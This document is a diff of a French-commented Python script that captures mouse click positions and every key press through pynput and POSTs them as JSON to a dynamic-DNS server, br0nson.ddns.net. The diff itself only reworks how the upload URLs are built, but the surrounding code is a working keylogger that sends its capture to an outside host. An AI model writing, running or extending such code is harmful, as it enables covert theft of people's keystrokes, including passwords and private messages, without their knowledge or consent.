@@ -4,13 +4,13 @@ import time
 from PIL import ImageGrab
 import os
 from datetime import datetime
+from pynput import keyboard
 import requests
 import json
 import base64
 import io  # Import nécessaire pour BytesIO
-from pynput import keyboard
 
-SERVER_URL = "http://br0nson.ddns.net:5000/upload"
+SERVER_URL = "http://br0nson.ddns.net:5000"
 
 def get_mouse_click_positions():
     try:
@@ -42,7 +42,7 @@ def get_mouse_click_positions():
 
                 # Envoyer la requête POST avec les données en JSON
                 try:
-                    response = requests.post(SERVER_URL, json=data)
+                    response = requests.post(f"{SERVER_URL}/upload", json=data)
                     print(f"Serveur réponse : {response.status_code}")
                 except requests.exceptions.RequestException as e:
                     print(f"Erreur d'envoi au serveur : {e}")
@@ -65,7 +65,7 @@ def get_mouse_click_positions():
 
                 # Envoyer la requête POST avec les données en JSON
                 try:
-                    response = requests.post(SERVER_URL, json=data)
+                    response = requests.post(f"{SERVER_URL}/upload", json=data)
                     print(f"Serveur réponse : {response.status_code}")
                 except requests.exceptions.RequestException as e:
                     print(f"Erreur d'envoi au serveur : {e}")
@@ -88,7 +88,7 @@ def get_mouse_click_positions():
 
                 # Envoyer la requête POST avec les données en JSON
                 try:
-                    response = requests.post(SERVER_URL, json=data)
+                    response = requests.post(f"{SERVER_URL}/upload", json=data)
                     print(f"Serveur réponse : {response.status_code}")
                 except requests.exceptions.RequestException as e:
                     print(f"Erreur d'envoi au serveur : {e}")
@@ -112,7 +112,7 @@ def keyPressed(key):
         }
         # Envoyer la requête POST au serveur
         try:
-            response = requests.post(SERVER_URL + "/key", json=data)
+            response = requests.post(f"{SERVER_URL}/upload/key", json=data)
             print(f"Serveur réponse (key) : {response.status_code}")
         except requests.exceptions.RequestException as e:
             print(f"Erreur d'envoi au serveur (key) : {e}")
@@ -126,7 +126,7 @@ def keyPressed(key):
         }
         # Envoyer la requête POST au serveur
         try:
-            response = requests.post(SERVER_URL + "/key", json=data)
+            response = requests.post(f"{SERVER_URL}/upload/key", json=data)
             print(f"Serveur réponse (key) : {response.status_code}")
         except requests.exceptions.RequestException as e:
             print(f"Erreur d'envoi au serveur (key) : {e}")
